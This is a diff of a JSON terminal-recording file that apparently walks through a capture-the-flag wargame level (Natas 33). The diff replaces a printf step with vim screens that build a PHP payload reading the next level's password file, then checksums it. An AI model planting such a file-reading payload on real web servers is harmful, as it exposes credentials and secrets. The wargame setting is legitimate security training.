@@ -3415,7 +3415,91 @@
      ]
     },
     {
-     "cmd": "printf '<?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>' > /tmp/n33payload.php\nmd5sum /tmp/n33payload.php",
+     "cmd": "vim /tmp/n33payload.php",
+     "text": "vim /tmp/n33payload.php -- the empty buffer",
+     "out": [
+      "  1 ",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "n33payload.php [New]   1,1  All"
+     ]
+    },
+    {
+     "cmd": "vim /tmp/n33payload.php",
+     "text": "vim /tmp/n33payload.php -- insert chunk 1",
+     "out": [
+      "  1 <?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "n33payload.php   1,1  All"
+     ]
+    },
+    {
+     "cmd": "vim /tmp/n33payload.php",
+     "text": "vim /tmp/n33payload.php -- finished, before :wq",
+     "out": [
+      "  1 <?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "n33payload.php   1,1  All"
+     ]
+    },
+    {
+     "cmd": "cat -n /tmp/n33payload.php",
+     "out": [
+      "     1\t<?php echo file_get_contents(\"/etc/natas_webpass/natas34\"); ?>"
+     ]
+    },
+    {
+     "cmd": "md5sum /tmp/n33payload.php",
      "out": [
       "8a54d751b7e2bbbb2643d355d49e81be  /tmp/n33payload.php"
      ]
